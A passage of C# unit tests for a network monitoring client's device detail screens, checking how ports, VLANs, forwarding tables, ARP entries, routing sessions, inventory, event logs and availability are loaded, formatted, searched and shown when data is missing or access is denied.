        Assert.False(row.IsLink);
    }

    [Theory]
    [InlineData(DeviceSection.Ports)]
    [InlineData(DeviceSection.Vlans)]
    [InlineData(DeviceSection.Fdb)]
    [InlineData(DeviceSection.Arp)]
    [InlineData(DeviceSection.Wireless)]
    public async Task A_device_with_no_ports_shows_the_empty_state_not_an_error(DeviceSection section)
    {
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns<IReadOnlyList<Port>>(_ => throw NoPortsFound());
        _client.Devices.GetWirelessSensorsAsync(DeviceId, Arg.Any<CancellationToken>()).Returns<IReadOnlyList<WirelessSensor>>(_ => throw NoPortsFound());
        _client.Vlans.ListAsync(Arg.Any<CancellationToken>()).Returns(Array.Empty<Vlan>());

        Assert.Empty(await Load(section));

        // As Core answers it: an empty list (DashyNMS/desktop#309).
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Array.Empty<Port>());
        _client.Devices.GetWirelessSensorsAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Array.Empty<WirelessSensor>());
        Assert.Empty(await Load(section));
    }

    [Fact]
    public async Task Vlans_count_the_ports_carrying_each()
    {
        _client.Vlans.ListAsync(Arg.Any<CancellationToken>()).Returns(
        [
            new Vlan { DeviceId = DeviceId, VlanNumber = 10, VlanName = "Users" },
            new Vlan { DeviceId = DeviceId, VlanNumber = 20, VlanName = "Voice" },
            new Vlan { DeviceId = 99, VlanNumber = 30 },
        ]);
        var trunk = Port(1, "Gi0/1");
        trunk.Vlans = [new PortVlanMembership { Vlan = 10 }, new PortVlanMembership { Vlan = 20 }];
        var access = Port(2, "Gi0/2");
        access.IfVlan = 10;
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns([trunk, access]);

        var rows = Assert.Single(await Load(DeviceSection.Vlans));

        Assert.Equal(["VLAN 10", "VLAN 20"], rows.Select(r => r.Title));
        Assert.Equal(["2 ports", "1 port"], rows.Select(r => r.Value));
    }

    [Fact]
    public async Task Vlans_keep_numeric_order_names_and_unknown_counts_without_duplicate_memberships()
    {
        const string name = "Example research and development VLAN with a long server-provided name";
        _client.Vlans.ListAsync(Arg.Any<CancellationToken>()).Returns(
        [
            new Vlan { DeviceId = DeviceId, VlanNumber = 100, VlanName = name },
            new Vlan { DeviceId = DeviceId, VlanNumber = 2 },
            new Vlan { DeviceId = 99, VlanNumber = 1 },
        ]);
        var port = Port(1, "Gi0/1");
        port.IfVlan = 100;
        port.Vlans = [new PortVlanMembership { Vlan = 100 }, new PortVlanMembership { Vlan = 100 }];
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns([port]);

        var rows = Assert.Single(await Load(DeviceSection.Vlans));
        Assert.Equal(["VLAN 2", "VLAN 100"], rows.Select(r => r.Title));
        Assert.All(rows, row =>
        {
            Assert.True(row.VlanLayout);
            Assert.Equal(RowStatus.None, row.Status);
            Assert.False(row.IsLink);
        });
        Assert.Null(rows[0].Value);
        Assert.Equal("Name unavailable", rows[0].VlanNameText);
        Assert.Equal("No member ports reported", rows[0].VlanPortsText);
        Assert.True(rows[0].Matches("member ports reported"));
        Assert.Equal(name, rows[1].Subtitle);
        Assert.Equal("1 port", rows[1].Value);
        Assert.Equal($"VLAN 100, {name}, 1 port", rows[1].VlanDescription);
        Assert.True(rows[1].Matches("research"));
        Assert.False(new SectionRow("Other section").Matches("unavailable"));
    }

    [Theory]
    [InlineData(false)]
    [InlineData(true)]
    public async Task Missing_ports_preserve_fdb_facts_and_port_identity(bool synchronous)
    {
        _client.Fdb.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            new[] { new FdbEntry { PortId = 99, MacAddress = "020000000001", VlanId = 50 } });
        _client.Vlans.ListAsync(Arg.Any<CancellationToken>()).Returns(
            new[] { new Vlan { DeviceId = DeviceId, VlanId = 50, VlanNumber = 300 } });
        var missing = new LibreNmsApiException("No endpoint", System.Net.HttpStatusCode.NotFound);
        if (synchronous)
            _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns<IReadOnlyList<Port>>(_ => throw missing);
        else
            _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Task.FromException<IReadOnlyList<Port>>(missing));
        var row = Assert.Single(Assert.Single(await Load(DeviceSection.Fdb)));
        Assert.Equal("02:00:00:00:00:01", row.Title);
        Assert.Equal("port 99", row.Subtitle);
        Assert.Equal("VLAN 300", row.FdbVlanText);
        Assert.True(row.FdbLayout);
        Assert.False(row.IsLink);
    }

    [Theory]
    [InlineData(403, false)]
    [InlineData(500, false)]
    [InlineData(0, false)]
    [InlineData(403, true)]
    public async Task Missing_fdb_source_does_not_mask_port_failure(int status, bool synchronous)
    {
        var missing = new LibreNmsApiException("No FDB", System.Net.HttpStatusCode.NotFound);
        var failure = new LibreNmsApiException("Ports failed", status == 0 ? null : (System.Net.HttpStatusCode)status) { IsTimeout = status == 0 };
        if (synchronous)
            _client.Fdb.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns<IReadOnlyList<FdbEntry>>(_ => throw missing);
        else
            _client.Fdb.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Task.FromException<IReadOnlyList<FdbEntry>>(missing));
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Task.FromException<IReadOnlyList<Port>>(failure));
        Assert.Same(failure, await Assert.ThrowsAsync<LibreNmsApiException>(() => Load(DeviceSection.Fdb)));
        await _client.Ports.Received(1).ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>());
    }

    [Fact]
    public async Task Both_missing_fdb_sources_remain_an_empty_section()
    {
        var missing = new LibreNmsApiException("No endpoint", System.Net.HttpStatusCode.NotFound);
        _client.Fdb.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Task.FromException<IReadOnlyList<FdbEntry>>(missing));
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Task.FromException<IReadOnlyList<Port>>(missing));
        Assert.Empty(await Load(DeviceSection.Fdb));
    }

    [Fact]
    public async Task Fdb_keeps_interface_order_mac_formatting_and_complete_context()
    {
        const string name = "Synthetic long interface name for the research network";
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [Port(1, name), Port(2, "Access interface")]);
        _client.Fdb.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
        [
            new FdbEntry { PortId = 1, MacAddress = "AABBCCDDEEFF", VlanId = 100 },
            new FdbEntry { PortId = 2, MacAddress = "001122334455", VlanId = 0 },
            new FdbEntry { PortId = 99, MacAddress = "002233445566" },
        ]);

        _client.Vlans.ListAsync(Arg.Any<CancellationToken>()).Returns(
            new[] { new Vlan { DeviceId = DeviceId, VlanId = 100, VlanNumber = 300 } });
        var rows = Assert.Single(await Load(DeviceSection.Fdb));
        Assert.Equal(["port 99", "Access interface", name], rows.Select(row => row.Subtitle));
        Assert.All(rows, row =>
        {
            Assert.True(row.FdbLayout);
            Assert.False(row.VlanLayout);
            Assert.False(row.IsLink);
            Assert.Equal(RowStatus.None, row.Status);
        });
        Assert.Null(rows[0].Value);
        Assert.Equal("VLAN not reported", rows[0].FdbVlanText);
        Assert.True(rows[0].Matches("not reported"));
        Assert.Equal("VLAN not reported", rows[1].FdbVlanText);
        Assert.Equal($"aa:bb:cc:dd:ee:ff, {name}, VLAN 300", rows[2].FdbDescription);
        Assert.True(rows[2].Matches("research"));
        Assert.True(rows[2].Matches("vlan 300"));
        Assert.False(new SectionRow("Other mode").Matches("not reported"));
        var card = new DeviceSectionCard(DeviceSectionInfo.For(DeviceSection.Fdb));
        card.Show([rows]);
        Assert.Equal(3, card.Highlights.Count);
        Assert.Contains(card.Highlights, row => row.FdbDescription == rows[2].FdbDescription);
    }

    [Theory]
    [InlineData(false)]
    [InlineData(true)]
    public async Task Fdb_mapping_404_preserves_records_with_unknown_vlan(bool synchronous)
    {
        _client.Fdb.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            new[] { new FdbEntry { PortId = 99, VlanId = 50 } });
        var missing = new LibreNmsApiException("No VLAN endpoint", System.Net.HttpStatusCode.NotFound);
        if (synchronous)
            _client.Vlans.ListAsync(Arg.Any<CancellationToken>()).Returns<IReadOnlyList<Vlan>>(_ => throw missing);
        else
            _client.Vlans.ListAsync(Arg.Any<CancellationToken>()).Returns(Task.FromException<IReadOnlyList<Vlan>>(missing));
        var row = Assert.Single(Assert.Single(await Load(DeviceSection.Fdb)));
        Assert.Equal("VLAN not reported", row.FdbVlanText);
        Assert.Null(row.Value);
    }

    [Theory]
    [InlineData(500, false)]
    [InlineData(0, false)]
    [InlineData(500, true)]
    public async Task Missing_fdb_does_not_mask_mapping_failure(int status, bool synchronous)
    {
        var missing = new LibreNmsApiException("No FDB", System.Net.HttpStatusCode.NotFound);
        _client.Fdb.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Task.FromException<IReadOnlyList<FdbEntry>>(missing));
        var failure = new LibreNmsApiException("VLAN lookup failed", status == 0 ? null : (System.Net.HttpStatusCode)status) { IsTimeout = status == 0 };
        if (synchronous)
            _client.Vlans.ListAsync(Arg.Any<CancellationToken>()).Returns<IReadOnlyList<Vlan>>(_ => throw failure);
        else
            _client.Vlans.ListAsync(Arg.Any<CancellationToken>()).Returns(Task.FromException<IReadOnlyList<Vlan>>(failure));
        Assert.Same(failure, await Assert.ThrowsAsync<LibreNmsApiException>(() => Load(DeviceSection.Fdb)));
        await _client.Ports.Received(1).ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>());
    }

    [Theory]
    [InlineData(false, false)]
    [InlineData(true, false)]
    [InlineData(false, true)]
    public async Task Denied_fleet_vlan_lookup_preserves_authorised_fdb(bool synchronous, bool missingFdb)
    {
        if (missingFdb)
            _client.Fdb.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Task.FromException<IReadOnlyList<FdbEntry>>(
                new LibreNmsApiException("No FDB", System.Net.HttpStatusCode.NotFound)));
        else
            _client.Fdb.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
                new[] { new FdbEntry { PortId = 99, MacAddress = "020000000001", VlanId = 50 } });
        var denied = new LibreNmsApiException("VLAN access denied", System.Net.HttpStatusCode.Forbidden);
        if (synchronous)
            _client.Vlans.ListAsync(Arg.Any<CancellationToken>()).Returns<IReadOnlyList<Vlan>>(_ => throw denied);
        else
            _client.Vlans.ListAsync(Arg.Any<CancellationToken>()).Returns(Task.FromException<IReadOnlyList<Vlan>>(denied));
        var groups = await Load(DeviceSection.Fdb);
        if (missingFdb) Assert.Empty(groups);
        else
        {
            var row = Assert.Single(Assert.Single(groups));
            Assert.Equal("02:00:00:00:00:01", row.Title);
            Assert.Equal("VLAN unavailable: permission denied", row.FdbVlanText);
            Assert.Contains("permission denied", row.FdbDescription);
            Assert.True(row.Matches("permission denied"));
        }
    }

    [Fact]
    public async Task Fdb_resolves_only_unambiguous_positive_tags_for_selected_device()
    {
        _client.Fdb.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            new int?[] { 50, 51, 52, 53, 54, 0, -1, null }.Select(id => new FdbEntry { PortId = 99, VlanId = id }).ToArray());
        _client.Vlans.ListAsync(Arg.Any<CancellationToken>()).Returns(new[]
        {
            new Vlan { DeviceId = DeviceId + 1, VlanId = 50, VlanNumber = 999 },
            new Vlan { DeviceId = DeviceId, VlanId = 50, VlanNumber = 300 },
            new Vlan { DeviceId = DeviceId, VlanId = 50, VlanNumber = 300 },
            new Vlan { DeviceId = DeviceId + 1, VlanId = 51, VlanNumber = 301 },
            new Vlan { DeviceId = DeviceId, VlanId = 52, VlanNumber = 1 },
            new Vlan { DeviceId = DeviceId, VlanId = 52, VlanNumber = 2 },
            new Vlan { DeviceId = DeviceId, VlanId = 53, VlanNumber = 0 },
        });
        var rows = Assert.Single(await Load(DeviceSection.Fdb));
        Assert.Equal("VLAN 300", rows[0].FdbVlanText);
        Assert.True(rows[0].Matches("VLAN 300"));
        Assert.False(rows[0].Matches("VLAN 50"));
        Assert.Contains("VLAN 300", rows[0].FdbDescription);
        Assert.All(rows.Skip(1), row => Assert.Equal("VLAN not reported", row.FdbVlanText));
        var card = new DeviceSectionCard(DeviceSectionInfo.For(DeviceSection.Fdb));
        card.Show([rows]);
        Assert.Equal("VLAN 300", card.Highlights[0].FdbVlanText);
    }

    [Theory]
    [InlineData("—")]
    [InlineData("–")]
    [InlineData("")]
    [InlineData(" ")]
    public void Fdb_names_missing_mac_without_changing_raw_title_or_other_search(string title)
    {
        var row = new SectionRow(title) { FdbLayout = true, Subtitle = "port 99" };
        Assert.Equal(title, row.Title);
        Assert.Equal("MAC address not reported", row.FdbMacText);
        Assert.Equal("MAC address not reported, port 99, VLAN not reported", row.FdbDescription);
        Assert.True(row.Matches("MAC address not reported"));
        Assert.False(new SectionRow(title).Matches("MAC address not reported"));
    }

    [Fact]
    public async Task Arp_sorts_addresses_numerically_and_tidies_macs()
    {
        _client.Arp.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
        [
            new ArpEntry { PortId = 1, Ipv4Address = "10.0.0.10", MacAddress = "AABBCCDDEEFF" },
            new ArpEntry { PortId = 1, Ipv4Address = "10.0.0.9", MacAddress = "00:11:22:33:44:55" },
        ]);
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns([Port(1, "Vlan10")]);

        var rows = Assert.Single(await Load(DeviceSection.Arp));

        Assert.Equal(["10.0.0.9", "10.0.0.10"], rows.Select(r => r.Title));
        Assert.Equal("aa:bb:cc:dd:ee:ff", rows[1].Subtitle);
        Assert.Equal("Vlan10", rows[0].Value);
    }

    [Fact]
    public async Task Arp_preserves_complete_context_and_overview_in_numeric_order()
    {
        const string name = "Very long synthetic interface description on example.net";
        _client.Arp.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
        [
            new ArpEntry { PortId = 1, Ipv4Address = "192.0.2.100", MacAddress = "AABBCCDDEEFF" },
            new ArpEntry { PortId = 99, Ipv4Address = "192.0.2.9", MacAddress = "unusual raw MAC" },
            new ArpEntry { PortId = 1, Ipv4Address = "192.0.2.9", MacAddress = "001122334455" },
        ]);
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns([Port(1, name)]);
        var groups = await Load(DeviceSection.Arp);
        var rows = Assert.Single(groups);
        Assert.Equal(["192.0.2.9", "192.0.2.9", "192.0.2.100"], rows.Select(r => r.Title));
        Assert.Equal("port 99", rows[0].Value);
        Assert.Equal("unusual raw MAC", rows[0].Subtitle);
        Assert.Equal($"192.0.2.100, aa:bb:cc:dd:ee:ff, {name}", rows[2].ArpDescription);
        Assert.All(rows, row =>
        {
            Assert.True(row.ArpLayout);
            Assert.False(row.FdbLayout);
            Assert.False(row.IsLink);
            Assert.Equal(RowStatus.None, row.Status);
        });
        Assert.True(rows[2].Matches(name));
        Assert.True(rows[2].Matches("AA:BB"));
        var card = new DeviceSectionCard(DeviceSectionInfo.For(DeviceSection.Arp));
        card.Show(groups);
        Assert.Equal(3, card.Highlights.Count);
        Assert.Contains(card.Highlights, row => row.ArpDescription == rows[2].ArpDescription);
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("—")]
    [InlineData("–")]
    public void Arp_missing_facts_are_named_without_mutating_source_or_sibling_search(string? missing)
    {
        var row = new SectionRow(missing ?? "—") { ArpLayout = true, Subtitle = missing };
        Assert.Equal(missing, row.Subtitle);
        Assert.Null(row.Value);
        Assert.Equal("IP address not reported, MAC address not reported, Interface not reported", row.ArpDescription);
        Assert.True(row.Matches("MAC address not reported"));
        Assert.True(row.Matches("Interface not reported"));
        Assert.False(new SectionRow("ordinary").Matches("not reported"));
    }

    [Fact]
    public async Task Routing_shows_bgp_state_and_leaves_out_empty_groups()
    {
        _client.Routing.ListBgpSessionsAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
        [
            new BgpSession { PeerIdentifier = "192.0.2.1", RemoteAs = 64500, State = "established", EstablishedSeconds = 3 * 86400 },
            new BgpSession { PeerIdentifier = "192.0.2.2", RemoteAs = 64501, State = "active", LastErrorText = "Hold timer expired" },
        ]);
        _client.Routing.ListOspfNeighboursAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Array.Empty<OspfNeighbour>());
        _client.Routing.ListOspfv3NeighboursAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Array.Empty<Ospfv3Neighbour>());
        _client.Routing.ListVrfsAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Array.Empty<Vrf>());

        var bgp = Assert.Single(await Load(DeviceSection.Routing));

        Assert.Equal("BGP sessions", bgp.Name);
        Assert.Equal("192.0.2.2", bgp[0].Title); // the broken one first
        Assert.Equal(RowStatus.Critical, bgp[0].Status);
        Assert.Equal("Hold timer expired", bgp[0].Detail);
        Assert.Equal("Up 3d 0h", bgp[1].Detail);
    }

    [Fact]
    public async Task Routing_preserves_protocol_context_and_complete_overview_facts()
    {
        var context = "example.net-" + new string('x', 160);
        _client.Routing.ListBgpSessionsAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [new BgpSession { PeerIdentifier = "192.0.2.7", State = "active", RemoteAs = 64500, LastErrorText = context }]);
        _client.Routing.ListOspfNeighboursAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [new OspfNeighbour { IpAddress = "192.0.2.8", RouterId = "192.0.2.9", State = "full", ContextName = context }]);
        _client.Routing.ListOspfv3NeighboursAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [new Ospfv3Neighbour { Address = "2001:db8::7", State = "init", ContextName = context }]);
        _client.Routing.ListVrfsAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [new Vrf { Name = context, Description = "Synthetic VRF", RouteDistinguisher = "64500:7" }]);
        var groups = await Load(DeviceSection.Routing);
        Assert.Equal(["BGP sessions", "OSPF neighbours", "VRFs"], groups.Select(g => g.Name));
        var rows = groups.SelectMany(g => g).ToArray();
        Assert.Equal(["BGP", "OSPF", "OSPFv3", "VRF"], rows.Select(r => r.RoutingKind));
        Assert.Equal([RowStatus.Critical, RowStatus.Ok, RowStatus.Warning, RowStatus.None], rows.Select(r => r.Status));
        Assert.All(rows, row =>
        {
            Assert.True(row.RoutingLayout);
            Assert.False(row.IsLink);
            Assert.Contains(context, row.RoutingDescription);
            Assert.True(row.Matches(context));
            Assert.True(row.Matches(row.RoutingKind!));
        });
        Assert.Equal(new string?[] { "Critical", "OK", "Warning", null }, rows.Select(r => r.RoutingStatusText));
        Assert.All(rows.Where(r => r.HasRoutingStatus), row =>
        {
            Assert.Contains(row.RoutingStatusText!, row.RoutingDescription);
            Assert.True(row.Matches(row.RoutingStatusText!));
        });
        Assert.False(rows[3].HasRoutingStatus);
        Assert.False(new SectionRow("example.net").Matches("Critical"));
        Assert.Equal("Route distinguisher: 64500:7", rows[3].RoutingValueText);
        var card = new DeviceSectionCard(DeviceSectionInfo.For(DeviceSection.Routing));
        card.Show(groups);
        Assert.Equal(4, card.Count);
        Assert.Equal([rows[0], rows[2], rows[1]], card.Highlights);
        Assert.All(card.Highlights, row => Assert.Contains(context, row.RoutingDescription));
    }

    [Theory]
    [InlineData("BGP", "State not reported")]
    [InlineData("OSPF", "State not reported")]
    [InlineData("OSPFv3", "State not reported")]
    [InlineData("VRF", "Route distinguisher not reported")]
    public void Routing_missing_facts_are_named_without_changing_raw_values(string kind, string expected)
    {
        var row = new SectionRow("—") { RoutingKind = kind };
        Assert.Equal(kind == "VRF" ? "VRF name not reported" : "Routing identity not reported", row.RoutingTitleText);
        Assert.Equal(expected, row.RoutingValueText);
        Assert.True(row.Matches(expected));
        Assert.Null(row.Value);
        Assert.Equal("—", row.Title);
        Assert.Equal(RowStatus.None, row.Status);
        Assert.False(new SectionRow("example.net").RoutingLayout);
        Assert.False(new SectionRow("example.net").Matches(expected));
    }

    [Fact]
    public async Task Routing_loader_names_missing_ospf_and_vrf_facts_without_changing_classification()
    {
        _client.Routing.ListOspfNeighboursAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [new OspfNeighbour()]);
        _client.Routing.ListVrfsAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [new Vrf()]);
        var rows = (await Load(DeviceSection.Routing)).SelectMany(g => g).ToArray();
        Assert.Equal(2, rows.Length);
        Assert.Equal("Routing identity not reported", rows[0].RoutingTitleText);
        Assert.Equal("State not reported", rows[0].RoutingValueText);
        Assert.Equal(RowStatus.Warning, rows[0].Status);
        Assert.Contains("Warning", rows[0].RoutingDescription);
        Assert.Equal("VRF", rows[1].Title);
        Assert.Equal("VRF name not reported", rows[1].RoutingTitleText);
        Assert.Equal("Route distinguisher not reported", rows[1].RoutingValueText);
        Assert.Equal(RowStatus.None, rows[1].Status);
        Assert.False(rows[1].HasRoutingStatus);
        Assert.Equal("VRF", new SectionRow("VRF") { RoutingKind = "VRF" }.RoutingTitleText);
    }

    [Fact]
    public async Task Inventory_is_a_tree_with_depth()
    {
        _client.Devices.GetInventoryAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
        [
            new InventoryEntry { Id = 1, Index = 1, ContainedIn = 0, Name = "Chassis", Class = "chassis", Serial = "FOC123" },
            new InventoryEntry { Id = 2, Index = 2, ContainedIn = 1, Name = "PSU 1", Class = "powerSupply" },
        ]);

        var rows = Assert.Single(await Load(DeviceSection.Inventory));

        Assert.Equal([0, 1], rows.Select(r => r.Depth));
        Assert.Equal("Serial FOC123", rows[0].Detail);
    }

    [Fact]
    public async Task Event_log_is_newest_first_and_coloured_by_severity()
    {
        _client.Logs.ListEventLogAsync(DeviceId, DeviceSectionLoader.EventLogLimit, Arg.Any<CancellationToken>()).Returns(
        [
            new EventLogEntry { Message = "Older", Timestamp = new DateTime(2026, 1, 1), Severity = 2 },
            new EventLogEntry { Message = "Device rebooted", Timestamp = new DateTime(2026, 1, 2), Severity = 5, Type = "reboot" },
        ]);

        var rows = Assert.Single(await Load(DeviceSection.EventLog));

        Assert.Equal(["Device rebooted", "Older"], rows.Select(r => r.Title));
        Assert.Equal(RowStatus.Critical, rows[0].Status);
        Assert.Contains("reboot", rows[0].Subtitle);
    }

    [Fact]
    public async Task Availability_shows_windows_and_outages_including_ongoing()
    {
        _client.Devices.GetAvailabilityAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [new AvailabilityWindow { DurationSeconds = 604800, Percent = 99.5 }, new AvailabilityWindow { DurationSeconds = 86400, Percent = 100 }]);
        _client.Devices.GetOutagesAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [new DeviceOutage { GoingDown = DateTime.Now.AddHours(-2) }]);

        var groups = await Load(DeviceSection.Availability);

        Assert.Equal(["Last 24 hours", "Last 7 days"], groups[0].Select(r => r.Title));
        Assert.Equal(RowStatus.Warning, groups[0][1].Status);
        Assert.Equal("Still down", groups[1][0].Subtitle);
        Assert.Equal(RowStatus.Critical, groups[1][0].Status);
    }

    [Theory]
    [InlineData(double.NaN)]
    [InlineData(double.PositiveInfinity)]
    [InlineData(-1d)]
    [InlineData(101d)]
    public async Task Invalid_availability_is_unavailable_without_a_success_colour(double percent)
    {
        _client.Devices.GetAvailabilityAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [new AvailabilityWindow { DurationSeconds = 2592000, Percent = percent }]);
        _client.Devices.GetOutagesAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Array.Empty<DeviceOutage>());
        var row = Assert.Single(Assert.Single(await Load(DeviceSection.Availability)));
        Assert.Equal("—", row.Value);
        Assert.Equal(RowStatus.None, row.Status);
        Assert.Contains("unavailable", row.ContentDescription);
        Assert.DoesNotContain("—", row.ContentDescription);
        Assert.True(row.AvailabilityLayout);
    }

    [Theory]
    [InlineData("AABBCCDDEEFF", "aa:bb:cc:dd:ee:ff")]
    [InlineData("aa-bb-cc-dd-ee-ff", "aa:bb:cc:dd:ee:ff")]
    [InlineData("weird", "weird")]
    [InlineData(null, "—")]
    public void Macs(string? raw, string expected) => Assert.Equal(expected, DeviceSectionLoader.Mac(raw));

    [Theory]
    [InlineData(999.0, "999 b/s")]
    [InlineData(12_345_678.0, "12.3 Mb/s")]
    [InlineData(1_000_000_000.0, "1 Gb/s")]
    public void Bit_rates(double bits, string expected) => Assert.Equal(expected, Units.Bits(bits));
}

public sealed class DeviceSectionViewModelTests
{
    [Fact]
    public async Task Changing_device_during_availability_load_discards_the_old_result()
    {
        var client = Fakes.Client();
        var old = new TaskCompletionSource<IReadOnlyList<AvailabilityWindow>>();
        client.Devices.GetAvailabilityAsync(7, Arg.Any<CancellationToken>()).Returns(old.Task);
        client.Devices.GetOutagesAsync(7, Arg.Any<CancellationToken>()).Returns(Array.Empty<DeviceOutage>());
        client.Devices.GetAvailabilityAsync(8, Arg.Any<CancellationToken>()).Returns(
            [new AvailabilityWindow { DurationSeconds = 86400, Percent = 95 }]);
        client.Devices.GetOutagesAsync(8, Arg.Any<CancellationToken>()).Returns(Array.Empty<DeviceOutage>());
        var vm = new DeviceSectionViewModel(new DeviceSectionLoader(client, Fakes.Settings()), new RecordingNavigation());
        var first = vm.LoadAsync(7, DeviceSection.Availability);
        var second = vm.LoadAsync(8, DeviceSection.Availability);
        Assert.Empty(vm.Groups);
        old.SetResult([new AvailabilityWindow { DurationSeconds = 86400, Percent = 100 }]);
        await Task.WhenAll(first, second);
        Assert.Equal(8, vm.DeviceId);
        Assert.Equal("95%", Assert.Single(Assert.Single(vm.Groups)).Value);
    }
    [Fact]
    public async Task Search_narrows_rows_and_drops_empty_groups()
    {
        var client = Fakes.Client();
        client.Arp.ListForDeviceAsync(7, Arg.Any<CancellationToken>()).Returns(
            Enumerable.Range(1, 20).Select(i => new ArpEntry { PortId = 1, Ipv4Address = $"10.0.0.{i}", MacAddress = $"0011223344{i:D2}" }).ToList());
        client.Ports.ListForDeviceAsync(7, Arg.Any<CancellationToken>()).Returns(Array.Empty<Port>());
        var vm = new DeviceSectionViewModel(new DeviceSectionLoader(client, Fakes.Settings()), new RecordingNavigation());

        await vm.LoadAsync(7, DeviceSection.Arp, "edge-rtr");

        Assert.Equal("ARP · edge-rtr", vm.Title);
        Assert.Equal("Search ARP", vm.SearchLabel);
        vm.SearchText = "10.0.0.2";
        Assert.Equal(["10.0.0.2", "10.0.0.20"], vm.Groups.Single().Select(r => r.Title));
        vm.SearchText = "nothing";
        Assert.True(vm.IsEmpty);
        Assert.Equal("Nothing matches.", vm.EmptyText);
    }

    [Fact]
    public async Task A_short_section_searches_and_closing_search_keeps_what_was_typed()
    {
        var client = Fakes.Client();
        client.Arp.ListForDeviceAsync(7, Arg.Any<CancellationToken>()).Returns(
            [new ArpEntry { PortId = 1, Ipv4Address = "10.0.0.1", MacAddress = "001122334401" }, new ArpEntry { PortId = 1, Ipv4Address = "10.0.0.2", MacAddress = "001122334402" }]);
        client.Ports.ListForDeviceAsync(7, Arg.Any<CancellationToken>()).Returns(Array.Empty<Port>());
        var vm = new DeviceSectionViewModel(new DeviceSectionLoader(client, Fakes.Settings()), new RecordingNavigation());
        await vm.LoadAsync(7, DeviceSection.Arp, "edge-rtr");

        vm.ToggleSearchCommand.Execute(null);
        Assert.True(vm.IsSearchOpen);
        vm.SearchText = "10.0.0.2";
        vm.DismissSearch();

        Assert.False(vm.IsSearchOpen);
        Assert.Equal("10.0.0.2", vm.SearchText);
        Assert.Equal(["10.0.0.2"], vm.Groups.Single().Select(r => r.Title));

        // The header's icon closes and clears it.
        vm.ToggleSearchCommand.Execute(null);
        vm.ToggleSearchCommand.Execute(null);
        Assert.Equal(string.Empty, vm.SearchText);
        Assert.Equal(2, vm.Groups.Single().Count);
    }

    [Fact]
    public async Task An_empty_section_says_so()
    {
        var client = Fakes.Client();
        client.Fdb.ListForDeviceAsync(7, Arg.Any<CancellationToken>()).Returns(Array.Empty<FdbEntry>());
        client.Ports.ListForDeviceAsync(7, Arg.Any<CancellationToken>()).Returns(Array.Empty<Port>());
        var vm = new DeviceSectionViewModel(new DeviceSectionLoader(client, Fakes.Settings()), new RecordingNavigation());

        await vm.LoadAsync(7, DeviceSection.Fdb);

        Assert.True(vm.IsEmpty);
        Assert.Equal("No fdb visible to this account", vm.EmptyText);
    }

    [Fact]
    public async Task Tapping_a_neighbour_that_is_a_device_opens_it()
    {
        var navigation = new RecordingNavigation();
        var vm = new DeviceSectionViewModel(new DeviceSectionLoader(Fakes.Client(), Fakes.Settings()), navigation);

        await vm.OpenLinkCommand.ExecuteAsync(new SectionRow("core-sw") { LinkDeviceId = 3 });
        await vm.OpenLinkCommand.ExecuteAsync(new SectionRow("unknown phone"));

        Assert.Equal(3, navigation.Visits.Single().Parameters![Routes.DeviceIdParameter]);
    }

    [Fact]
    public async Task Tapping_a_port_opens_its_graphs()
    {
        var navigation = new RecordingNavigation();
        var client = Fakes.Client();
        client.Ports.ListForDeviceAsync(7, Arg.Any<CancellationToken>()).Returns([new Port { PortId = 1, IfName = "Gi0/5", IfDescr = "GigabitEthernet0/5", IfOperStatus = "up" }]);
        var vm = new DeviceSectionViewModel(new DeviceSectionLoader(client, Fakes.Settings()), navigation);
        await vm.LoadAsync(7, DeviceSection.Ports, "edge-rtr");

        var row = vm.Groups.SelectMany(g => g).Single();
        Assert.True(row.IsLink);
        await vm.OpenLinkCommand.ExecuteAsync(row);

        var visit = navigation.Visits.Single();
        Assert.Equal(Routes.DeviceGraphs, visit.Route);
        Assert.Equal(7, visit.Parameters![Routes.DeviceIdParameter]);
